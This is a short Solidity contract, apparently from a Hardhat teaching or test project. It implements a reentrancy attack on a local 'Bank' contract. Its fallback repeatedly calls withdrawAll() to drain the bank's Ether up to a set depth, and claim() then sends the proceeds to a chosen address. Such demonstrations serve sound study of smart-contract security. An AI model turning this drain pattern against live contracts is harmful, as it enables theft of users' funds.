// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;
import "./Bank.sol";
import "hardhat/console.sol";

contract Attacker {

    Bank public bank;
    uint public maxDepth = 5;
    uint public depth;

    constructor(address _bankAddress) {
        bank = Bank(_bankAddress);
    }

    function setBank(address _bankAddress) external {
        bank = Bank(_bankAddress);
    }

    function setMaxDepth(uint _maxDepth) external {
        maxDepth = _maxDepth;
    }

    // Fallback is called when Bank sends Ether to this contract.
    fallback() external payable {

        if (address(bank).balance > 0 && depth < maxDepth) {
            depth++;
            bank.withdrawAll();
        }else{
            depth = 0;
        }
    }

    function attack() external payable {

        require(msg.value >= 0);

        bank.deposit{value: msg.value}();
        bank.withdrawAll();
    }

    function claim(address _receiver) external {
        payable(_receiver).transfer(address(this).balance);
    }
}